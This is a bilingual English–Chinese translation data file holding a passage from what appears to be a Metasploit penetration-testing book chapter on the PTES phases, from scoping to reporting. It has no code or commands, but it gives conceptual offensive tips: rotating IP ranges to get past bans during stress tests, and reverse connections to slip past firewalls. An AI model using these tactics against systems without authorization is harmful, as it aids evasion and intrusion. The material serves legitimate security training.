- en: Approaching a Penetration Test Using Metasploit
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit进行渗透测试
- en: '**Penetration testing** is an intentional attack on a computer-based system
    where the intention is to find vulnerabilities, security weaknesses, and certifying
    whether a system is secure. A penetration test will advise an organization on
    their security posture if it is vulnerable to an attack, whether the implemented
    security is enough to oppose any invasion, which security controls can be bypassed,
    and much more. Hence, a penetration test focuses on improving the security posture
    of an organization.'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: '**渗透测试**是对基于计算机的系统的有意攻击，其目的是发现漏洞、安全弱点，并验证系统是否安全。渗透测试将向组织提供建议，告知其安全状况是否容易受到攻击，已实施的安全是否足以抵御任何入侵，可以绕过哪些安全控制等等。因此，渗透测试侧重于改善组织的安全状况。'
- en: Achieving success in a penetration test largely depends on using the right set
    of tools and techniques. A penetration tester must choose the right set of tools
    and methodologies to complete a test. While talking about the best tools for penetration
    testing, the first one that comes to mind is Metasploit. It is considered one
    of the most effective auditing tools to carry out penetration testing today. Metasploit
    offers a wide variety of exploits, an excellent exploit development environment,
    information gathering and web testing capabilities, and much more.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 成功进行渗透测试在很大程度上取决于使用正确的工具和技术。渗透测试人员必须选择正确的工具和方法来完成测试。在谈论渗透测试的最佳工具时，首先想到的是Metasploit。它被认为是今天进行渗透测试的最有效的审计工具之一。Metasploit提供了各种各样的利用、优秀的利用开发环境、信息收集和Web测试能力等等。
- en: 'While covering Metasploit from the very basics to the elite level, we will
    stick to a step-by-step approach, as shown in the following diagram:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在从基础到精英级别介绍Metasploit的过程中，我们将坚持逐步方法，如下图所示：
- en: '![](img/c26e8fb4-1b91-477b-a834-932e4d41793e.png)'
  id: totrans-4
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c26e8fb4-1b91-477b-a834-932e4d41793e.png)'
- en: This chapter will help you recall the basics of penetration testing and Metasploit,
    which will help you warm up to the pace of this book.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将帮助您回顾渗透测试和Metasploit的基础知识，这将帮助您适应本书的节奏。
- en: 'In this chapter, you will learn about the following topics:'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，您将学习以下主题：
- en: The phases of penetration testing
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 渗透测试的各个阶段
- en: The basics of the Metasploit framework
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit框架的基础知识
- en: The workings of Metasploit exploit and scanner modules
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit利用和扫描模块的工作原理
- en: Testing a target network with Metasploit
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit测试目标网络
- en: The benefits of using databases
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用数据库的好处
- en: Pivoting and diving deep into internal networks
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 转向并深入内部网络
- en: An important point to take note of here is that we might not become an expert
    penetration tester in a single day. It takes practice, familiarization with the
    work environment, the ability to perform in critical situations, and most importantly,
    an understanding of how we have to cycle through the various stages of a penetration
    test.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 这里需要注意的一个重要点是，我们可能不会在一天内成为专业的渗透测试人员。这需要实践，熟悉工作环境，能够在关键情况下表现，最重要的是，了解我们如何在渗透测试的各个阶段之间循环。
- en: 'When we think about conducting a penetration test on an organization, we need
    to make sure that everything is set correctly and is according to a penetration
    test standard. Therefore, if you feel you are new to penetration testing standards
    or uncomfortable with the term **Penetration Testing Execution Standard** (**PTES**),
    please refer to [http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
    to become more familiar with penetration testing and vulnerability assessments.
    According to PTES, the following diagram explains the various phases of a penetration
    test:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们考虑在组织上进行渗透测试时，我们需要确保一切都设置正确，并符合渗透测试标准。因此，如果您觉得对渗透测试标准或术语**渗透测试执行标准**（**PTES**）不熟悉，请参考[http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)以更熟悉渗透测试和漏洞评估。根据PTES，以下图解释了渗透测试的各个阶段：
- en: '![](img/65d5a743-be85-4ded-85c3-05e1910bd383.png)'
  id: totrans-15
  prefs: []
  type: TYPE_IMG
  zh: '![](img/65d5a743-be85-4ded-85c3-05e1910bd383.png)'
- en: Refer to the pentest standard website, [http://www.pentest-standard.org/index.php/Main_Page](http://www.pentest-standard.org/index.php/Main_Page) [to
    set up the hardware and systematic stages to be followed in setting up a work
    environment.](http://www.pentest-standard.org/index.php/Main_Page)
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 请参考渗透测试标准网站，[http://www.pentest-standard.org/index.php/Main_Page](http://www.pentest-standard.org/index.php/Main_Page)
    [设置硬件和系统化阶段，以便在设置工作环境时遵循。](http://www.pentest-standard.org/index.php/Main_Page)
- en: Organizing a penetration test
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 组织渗透测试
- en: Before we start firing sophisticated and complex attacks with Metasploit, let's
    understand the various phases of a penetration test and see how to organize a
    penetration test on a professional scale.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始使用Metasploit进行复杂和复杂的攻击之前，让我们了解渗透测试的各个阶段，并看看如何在专业范围内组织渗透测试。
- en: Preinteractions
  id: totrans-19
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 预交互
- en: The very first phase of a penetration test, preinteractions, involves a discussion
    of the critical factors regarding the conduct of a penetration test on a client's
    organization, company, institute, or network with the client itself. This phase
    serves as the connecting line between the penetration tester, the client, and
    his/her requirements. Preinteractions help a client get enough knowledge on what
    is to be performed over his or her network/domain or server.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试的第一个阶段，预交互，涉及讨论关于在客户的组织、公司、学院或网络上进行渗透测试的关键因素，与客户本身进行讨论。这个阶段作为渗透测试人员、客户和他/她的需求之间的联系线。预交互帮助客户充分了解在他或她的网络/域或服务器上要执行的工作。
- en: 'Therefore, the tester will serve here as an educator to the client. The penetration
    tester also discusses the scope of the test, gathers knowledge on all the domains
    under the scope of the project, and any special requirements that will be needed
    while conducting the analysis. The requirements include special privileges, access
    to critical systems, network or system credentials, and much more. The expected
    positives of the project should also be the part of the discussion with the client
    in this phase. As a process, preinteractions discuss some of the following key
    points:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，测试人员将在这里充当客户的教育者。渗透测试人员还讨论测试范围，收集项目范围内所有领域的知识，以及在进行分析时可能需要的任何特殊要求。这些要求包括特殊权限，访问关键系统，网络或系统凭据等。项目的预期积极方面也应该在这个阶段与客户讨论。作为一个过程，预交互讨论以下一些关键点：
- en: '**Scope**: This section reviews the scope of the project and estimates the
    size of the project. The scope also defines what to include for testing and what
    to exclude from the test. The tester also discusses IP ranges and domains under
    the scope and the type of test (black box or white box). In case of a white box
    test, the tester discusses the kind of access and required credentials as well;
    the tester also creates, gathers, and maintains questionnaires for administrators.
    The schedule and duration of the test, whether to include stress testing or not,
    and payment, are included in the scope. A general scope document provides answers
    to the following questions:'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**范围**：本节审查项目的范围并估计项目的规模。范围还定义了测试的包含和排除内容。测试人员还讨论了范围内的IP范围和域以及测试类型（黑盒或白盒）。在白盒测试的情况下，测试人员还讨论了访问的种类和所需的凭据；测试人员还为管理员创建、收集和维护问卷。测试的时间表和持续时间，是否包括压力测试或不包括，以及付款都包括在范围内。一份一般的范围文件提供了以下问题的答案：'
- en: What are the target organization's most significant security concerns?
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 目标组织最重要的安全关注点是什么？
- en: What specific hosts, network address ranges, or applications should be tested?
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 哪些特定主机、网络地址范围或应用程序应该被测试？
- en: What specific hosts, network address ranges, or applications should explicitly
    NOT be tested?
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 哪些特定主机、网络地址范围或应用程序明确不应该被测试？
- en: Are there any third parties that own systems or networks that are in the scope,
    and which systems do they hold (written permission must have been obtained in
    advance by the target organization)?
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否有任何第三方拥有在范围内的系统或网络，并且他们持有哪些系统（目标组织必须事先获得书面许可）？
- en: Will the test be performed in a live production environment or a test environment?
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 测试将在实时生产环境还是测试环境中进行？
- en: 'Will the penetration test include the following testing techniques: ping sweep
    of network ranges, a port scan of target hosts, vulnerability scan of targets,
    penetration of targets, application-level manipulation, client-side Java/ActiveX
    reverse engineering, physical penetration attempts, social engineering?'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 渗透测试是否包括以下测试技术：网络范围的ping扫描、目标主机的端口扫描、目标的漏洞扫描、目标的渗透、应用程序级别的操纵、客户端Java/ActiveX反向工程、物理渗透尝试、社会工程？
- en: Will the penetration test include internal network testing? If so, how will
    access be obtained?
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 渗透测试是否包括内部网络测试？如果是，如何获得访问权限？
- en: Are client/end user systems included in the scope? If so, how many clients will
    be leveraged?
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 客户/最终用户系统是否包含在范围内？如果是，将利用多少客户端？
- en: Is social engineering allowed? If so, how may it be used?
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否允许社会工程？如果是，可能如何使用？
- en: Is Denial of Service attacks allowed?
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否允许拒绝服务攻击？
- en: Are dangerous checks/exploits allowed?
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否允许危险检查/利用？
- en: '**Goals**: This section discusses various primary and secondary objectives
    that a penetration test is set to achieve. The common questions related to the
    goals are as follows:'
  id: totrans-34
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**目标**：本节讨论渗透测试设定的各种主要和次要目标。与目标相关的常见问题如下：'
- en: What is the business requirement for this penetration test?
  id: totrans-35
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 这次渗透测试的业务需求是什么？
- en: Is the test required by a regulatory audit or just a standard procedure?
  id: totrans-36
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 测试是否是由监管审计要求的，还是只是标准程序？
- en: What are the objectives?
  id: totrans-37
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 目标是什么？
- en: Map out vulnerabilities
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绘制漏洞地图
- en: Demonstrate that the vulnerabilities exist
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 证明漏洞存在
- en: Test the incident response
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 测试事件响应
- en: Actual exploitation of a vulnerability in a network, system, or application
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在网络、系统或应用程序中实际利用漏洞
- en: All of the above
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 以上所有内容
- en: '**Testing terms and definitions**: This phase discusses basic terminologies
    with the client and helps the client in understanding the terms well'
  id: totrans-43
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**测试术语和定义**：这个阶段讨论基本术语与客户，并帮助客户更好地理解这些术语'
- en: '**Rules of engagement**: This section defines the time of testing, timeline,
    permissions to attack, and regular meetings to update the status of the ongoing
    test. The common questions related to rules of engagement are as follows:'
  id: totrans-44
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**规则约定**：本节定义测试时间、时间表、攻击权限和定期会议更新正在进行的测试的状态。与规则约定相关的常见问题如下：'
- en: At what time do you want these tests to be performed?
  id: totrans-45
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 您希望在什么时间进行这些测试？
- en: During business hours
  id: totrans-46
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在工作时间内
- en: After business hours
  id: totrans-47
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 工作时间之后
- en: Weekend hours
  id: totrans-48
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 周末时间
- en: During a system maintenance window
  id: totrans-49
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在系统维护窗口期间
- en: Will this testing be done in a production environment?
  id: totrans-50
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 这个测试将在生产环境中进行吗？
- en: If production environments should not be affected, does a similar environment
    (development or test systems) exist that can be used to conduct the penetration
    test?
  id: totrans-51
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 如果不应影响生产环境，是否存在可以用于进行渗透测试的类似环境（开发或测试系统）？
- en: Who is the technical point of contact?
  id: totrans-52
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 谁是技术联系人？
- en: For more information on preinteractions, refer to: [http://www.pentest-standard.org/index.php/File:Pre-engagement.png](http://www.pentest-standard.org/index.php/File:Pre-engagement.png).
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 有关预交互的更多信息，请参阅：[http://www.pentest-standard.org/index.php/File:Pre-engagement.png](http://www.pentest-standard.org/index.php/File:Pre-engagement.png)。
- en: Intelligence gathering/reconnaissance phase
  id: totrans-54
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 情报收集/侦察阶段
- en: In the intelligence-gathering stage, you need to gather as much information
    as possible about the target network. The target network could be a website, an
    organization, or might be a full-fledged fortune company. The most important aspect
    is to gather information about the target from social media networks and use Google
    Hacking (a way to extract sensitive information from Google using specific queries)
    to find confidential and sensitive information related to the organization to
    be tested. **Footprinting** the organization using active and passive attacks
    can also be an approach.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 在情报收集阶段，您需要尽可能收集有关目标网络的信息。目标网络可能是一个网站、一个组织，或者可能是一个成熟的财富公司。最重要的是从社交媒体网络中收集有关目标的信息，并使用Google
    Hacking（一种使用特定查询从Google中提取敏感信息的方法）来查找与待测试组织相关的机密和敏感信息。使用主动和被动攻击对组织进行足迹定位也是一种方法。
- en: The intelligence gathering phase is one of the most crucial aspects of penetration
    testing. Correctly gained knowledge about the target will help the tester to simulate
    appropriate and exact attacks, rather than trying all possible attack mechanisms;
    it will also help the tester save a considerable amount of time as well. This
    phase will consume 40 to 60 percent of the total time of testing, as gaining access
    to the target depends mainly upon how well the system is footprinted.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 情报收集阶段是渗透测试中最关键的方面之一。对目标正确获得的知识将帮助测试人员模拟适当和准确的攻击，而不是尝试所有可能的攻击机制；它还将帮助测试人员节省相当多的时间。这个阶段将消耗测试总时间的40%到60%，因为获取对目标的访问主要取决于系统的足迹有多好。
- en: A penetration tester must gain adequate knowledge about the target by conducting
    a variety of scans, looking for open ports, service identification, and choosing
    which services might be vulnerable and how to make use of them to enter the desired
    system.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试人员必须通过进行各种扫描来获取关于目标的充分了解，寻找开放端口、服务识别，并选择哪些服务可能存在漏洞以及如何利用它们进入所需的系统。
- en: The procedures followed during this phase are required to identify the security
    policies and mechanisms that are currently deployed on the target infrastructure,
    and to what extent they can be circumvented.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个阶段遵循的程序需要确定目标基础设施上当前部署的安全策略和机制，以及它们可以被规避到什么程度。
- en: Let's discuss this using an example. Consider a black box test against a web
    server where the client wants to perform a network stress test.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们用一个例子来讨论这个问题。考虑对一个客户要求进行网络压力测试的Web服务器进行黑盒测试。
- en: Here, we will be testing a server to check what level of bandwidth and resource
    stress the server can bear or in simple terms, how the server is responding to
    the **Denial of Service** (**DoS**) attack. A DoS attack or a stress test is the
    name given to the procedure of sending indefinite requests or data to a server
    to check whether the server can handle and respond to all the requests successfully
    or crashes causing a DoS. A DoS can also occur if the target service is vulnerable
    to specially crafted requests or packets. To achieve this, we start our network
    stress testing tool and launch an attack towards a target website. However, after
    a few seconds of launching the attack, we see that the server is not responding
    to our browser and the site does not open. Additionally, a page shows up saying
    that the website is currently offline. So what does this mean? Did we successfully
    take out the web server we wanted? Nope! In reality, it is a sign of a protection
    mechanism set by the server administrator that sensed our malicious intent of
    taking the server down and hence resulted in the ban of our IP address. Therefore,
    we must collect correct information and identify various security services at
    the target before launching an attack.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们将测试服务器，以检查服务器能够承受多少带宽和资源压力，或者简单来说，服务器如何响应**拒绝服务**（**DoS**）攻击。DoS攻击或压力测试是指向服务器发送无限请求或数据的过程，以检查服务器是否能够成功处理和响应所有请求，或者导致DoS崩溃。如果目标服务容易受到特制请求或数据包的攻击，也可能发生DoS。为了实现这一点，我们启动我们的网络压力测试工具，并向目标网站发起攻击。然而，启动攻击几秒钟后，我们发现服务器没有响应我们的浏览器，网站也无法打开。此外，一个页面显示网站目前处于离线状态。那么这意味着什么？我们成功地关闭了我们想要的网络服务器吗？没有！实际上，这是服务器管理员设置的一种保护机制的迹象，它察觉到我们恶意意图关闭服务器，因此导致我们的IP地址被禁止。因此，在发动攻击之前，我们必须收集正确的信息并确定目标处的各种安全服务。
- en: A better approach is to test the web server from a different IP range. Maybe
    keeping two to three different virtual private servers for testing is the right
    approach. Also, I advise you to test all the attack vectors under a virtual environment
    before launching these attack vectors onto the real targets. Proper validation
    of the attack vectors is mandatory because if we do not validate the attack vectors
    before the attack, it may crash the service at the target, which is not favorable
    at all. Network stress tests should be performed towards the end of the engagement
    or in a maintenance window. Additionally, it is always helpful to ask the client
    for whitelisting IP addresses, which are used for testing.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 更好的方法是从不同的IP范围测试Web服务器。也许保留两到三个不同的虚拟专用服务器进行测试是正确的方法。此外，我建议您在将这些攻击向真实目标发动之前，在虚拟环境中测试所有攻击向量。攻击向量的正确验证是强制性的，因为如果我们在攻击之前不验证攻击向量，可能会导致目标服务崩溃，这是不可取的。网络压力测试应该在参与或维护窗口的最后阶段进行。此外，向客户要求将用于测试的IP地址列入白名单始终是有帮助的。
- en: Now, let's look at the second example. Consider a black box test against a Windows
    2012 server. While scanning the target server, we find that port `80` and port
    `8080` are open. On port `80`, we see the latest version of **Internet Information
    Services** (**IIS**) running, while on port `8080`, we discover that the vulnerable
    version of the **Rejetto HFS Server** is running, which is prone to the **Remote
    Code Execution** flaw.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们看第二个例子。考虑对Windows 2012服务器进行黑盒测试。在扫描目标服务器时，我们发现端口`80`和端口`8080`是开放的。在端口`80`上，我们看到运行着最新版本的**Internet
    Information Services** (**IIS**)，而在端口`8080`上，我们发现运行着易受**远程代码执行**漏洞影响的**Rejetto
    HFS Server**的脆弱版本。
- en: However, when we try to exploit this vulnerable version of HFS, the exploit
    fails. The situation is a typical scenario where the firewall blocks malicious
    inbound traffic.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，当我们尝试利用这个易受攻击的HFS版本时，攻击失败了。这种情况是防火墙阻止恶意入站流量的典型场景。
- en: In this case, we can simply change our approach to connecting back from the
    server, which will establish a connection from the target back to our system,
    rather than us connecting to the server directly. The change may prove to be more
    successful as firewalls are commonly being configured to inspect ingress traffic
    rather than egress traffic.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们可以简单地改变我们连接回服务器的方式，这将建立从目标回到我们系统的连接，而不是我们直接连接到服务器。这种改变可能会更成功，因为防火墙通常被配置为检查入站流量而不是出站流量。
- en: 'As a process, this phase can be broken down into the following key points:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 作为一个过程，这个阶段可以分解为以下关键点：
- en: '**Target selection**: Selecting the targets to attack, identifying the goals
    of the attack, and the time of the attack.'
  id: totrans-66
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**目标选择**: 选择要攻击的目标，确定攻击的目标和攻击的时间。'
- en: '**Covert gathering**: This involves the collection of data from the physical
    site, the equipment in use, and dumpster diving. This phase is a part of on-location
    white box testing only.'
  id: totrans-67
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**隐蔽收集**: 这涉及从物理场所、使用的设备和垃圾箱中收集数据。这个阶段只是定位白盒测试的一部分。'
- en: '**Footprinting**: Footprinting consists of active or passive scans to identify
    various technologies and software deployed on the target, which includes port
    scanning, banner grabbing, and so on.'
  id: totrans-68
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**足迹**: 足迹包括主动或被动扫描，以识别目标上部署的各种技术和软件，包括端口扫描、横幅抓取等。'
- en: '**Identifying protection mechanisms**: This involves identifying firewalls,
    filtering systems, network- and host-based protections, and so on.'
  id: totrans-69
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**识别保护机制**：这涉及识别防火墙、过滤系统、基于网络和主机的保护等。'
- en: For more information on gathering intelligence, refer to: [http://www.pentest-standard.org/index.php/Intelligence_Gathering](http://www.pentest-standard.org/index.php/Intelligence_Gathering).
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 有关情报收集的更多信息，请参阅：[http://www.pentest-standard.org/index.php/Intelligence_Gathering](http://www.pentest-standard.org/index.php/Intelligence_Gathering)。
- en: Threat modeling
  id: totrans-71
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 威胁建模
- en: 'Threat modeling helps in conducting a comprehensive penetration test. This
    phase focuses on modeling out true threats, their effect, and their categorization
    based on the impact they can cause. Based on the analysis made during the intelligence
    gathering phase, we can model the best possible attack vectors. Threat modeling
    applies to business asset analysis, process analysis, threat analysis, and threat
    capability analysis. This phase answers the following set of questions:'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 威胁建模有助于进行全面的渗透测试。这个阶段侧重于对真实威胁的建模，它们的影响以及基于它们可能造成的影响进行分类。根据情报收集阶段的分析，我们可以建模出最佳的攻击向量。威胁建模适用于业务资产分析、流程分析、威胁分析和威胁能力分析。这个阶段回答以下一系列问题：
- en: How can we attack a particular network?
  id: totrans-73
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们如何攻击特定网络？
- en: To which critical sections do we need to gain access?
  id: totrans-74
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们需要获得对哪些关键部分的访问权限？
- en: What approach is best suited for the attack?
  id: totrans-75
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 哪种方法最适合攻击？
- en: What are the highest-rated threats?
  id: totrans-76
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 最高评级的威胁是什么？
- en: 'Modeling threats will help a penetration tester to perform the following set
    of operations:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 建模威胁将帮助渗透测试人员执行以下一系列操作：
- en: Gather relevant documentation about high-level threats
  id: totrans-78
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 收集关于高级威胁的相关文档
- en: Identify an organization's assets on a categorical basis
  id: totrans-79
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 根据分类基础确定组织的资产
- en: Identify and categorize risks
  id: totrans-80
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 识别和分类风险
- en: Mapping threats to the assets of a corporation
  id: totrans-81
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 将威胁映射到公司的资产
- en: Modeling threats will help to define the highest priority assets with risks
    that can influence these assets.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 建模威胁将有助于定义具有风险的最高优先级资产。
- en: Consider a black box test against a company's website. Here, information about
    the company's clients is the primary asset. It is also possible that in a different
    database on the same backend, transaction records are also stored. In this case,
    an attacker can use the threat of a SQL injection to step over to the transaction
    records database. Hence, transaction records are the secondary asset. Having the
    sight of impacts, we can map the risk of the SQL injection attack to the assets.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 考虑对公司网站进行黑盒测试。在这里，关于公司客户的信息是主要资产。在同一后端的不同数据库中，也可能存储了交易记录。在这种情况下，攻击者可以利用SQL注入的威胁跨越到交易记录数据库。因此，交易记录是次要资产。通过了解影响，我们可以将SQL注入攻击的风险映射到资产上。
- en: Vulnerability scanners such as **Nexpose** and the Pro version of Metasploit
    can help model threats precisely and quickly by using the automated approach.
    Hence, it can prove to be handy while conducting extensive tests.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞扫描器如**Nexpose**和Metasploit的专业版可以通过自动化方法精确快速地建模威胁。因此，在进行广泛测试时，它可能会很有用。
- en: For more information on the processes involved during the threat modeling phase,
    refer to: [http://www.pentest-standard.org/index.php/Threat_Modeling](http://www.pentest-standard.org/index.php/Threat_Modeling).
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 有关威胁建模阶段涉及的流程的更多信息，请参阅：[http://www.pentest-standard.org/index.php/Threat_Modeling](http://www.pentest-standard.org/index.php/Threat_Modeling)。
- en: Vulnerability analysis
  id: totrans-86
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 漏洞分析
- en: Vulnerability analysis is the process of discovering flaws in a system or an
    application. These flaws can vary from a server to the web applications, from
    insecure application design to vulnerable database services, and from a **VOIP**-based
    server to **SCADA**-based services. This phase contains three different mechanisms,
    which are testing, validation, and research. Testing consists of active and passive
    tests. Validation consists of dropping the false positives and confirming the
    existence of vulnerabilities through manual validations. Research refers to verifying
    a vulnerability that is found and triggering it to prove its presence.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞分析是发现系统或应用程序中缺陷的过程。这些缺陷可以从服务器到Web应用程序，从不安全的应用程序设计到易受攻击的数据库服务，从基于VOIP的服务器到基于SCADA的服务。这个阶段包含三种不同的机制，即测试、验证和研究。测试包括主动和被动测试。验证包括删除错误的阳性结果，并通过手动验证确认漏洞的存在。研究是指验证发现的漏洞并触发它以证明其存在。
- en: For more information on the processes involved during the threat-modeling phase,
    refer to: [http://www.pentest-standard.org/index.php/Vulnerability_Analysis](http://www.pentest-standard.org/index.php/Vulnerability_Analysis).
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 有关威胁建模阶段涉及的过程的更多信息，请参阅：[http://www.pentest-standard.org/index.php/Vulnerability_Analysis](http://www.pentest-standard.org/index.php/Vulnerability_Analysis)。
- en: Exploitation and post-exploitation
  id: totrans-89
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用和后渗透
- en: The exploitation phase involves taking advantage of the previously discovered
    vulnerabilities. This stage is the actual attack phase. In this phase, a penetration
    tester fires up exploits at the target vulnerabilities of a system to gain access.
    This phase is covered heavily throughout the book.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 利用阶段涉及利用先前发现的漏洞。这个阶段是实际的攻击阶段。在这个阶段，渗透测试人员在系统的目标漏洞上启动利用程序以获取访问权限。这个阶段在整本书中都有详细介绍。
- en: The post-exploitation phase is the latter phase of exploitation. This stage
    covers various tasks that we can perform on an exploited system, such as elevating
    privileges, uploading/downloading files, pivoting, and so on.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 后渗透阶段是利用的后阶段。这个阶段涵盖了我们可以在被利用的系统上执行的各种任务，如提升权限、上传/下载文件、枢纽等。
- en: For more information on the processes involved during the exploitation phase,
    refer to: [http://www.pentest-standard.org/index.php/Exploitation](http://www.pentest-standard.org/index.php/Exploitation).
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 有关利用阶段涉及的过程的更多信息，请参阅：[http://www.pentest-standard.org/index.php/Exploitation](http://www.pentest-standard.org/index.php/Exploitation)。
- en: For more information on post-exploitation, refer to [http://www.pentest-standard.org/index.php/Post_Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation).
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 有关后渗透的更多信息，请参阅[http://www.pentest-standard.org/index.php/Post_Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)。
- en: Reporting
  id: totrans-94
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 报告
- en: Creating a formal report of the entire penetration test is the last phase to
    conduct while carrying out a penetration test. Identifying key vulnerabilities,
    creating charts and graphs, recommendations, and proposed fixes are a vital part
    of the penetration test report. An entire section dedicated to reporting is covered
    in the latter half of this book.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行渗透测试时，创建整个渗透测试的正式报告是最后一个阶段。识别关键漏洞、创建图表和图形、建议和提出修复措施是渗透测试报告的重要部分。整本书的后半部分都专门讨论了报告。
- en: For more information on the processes involved during the threat modeling phase,
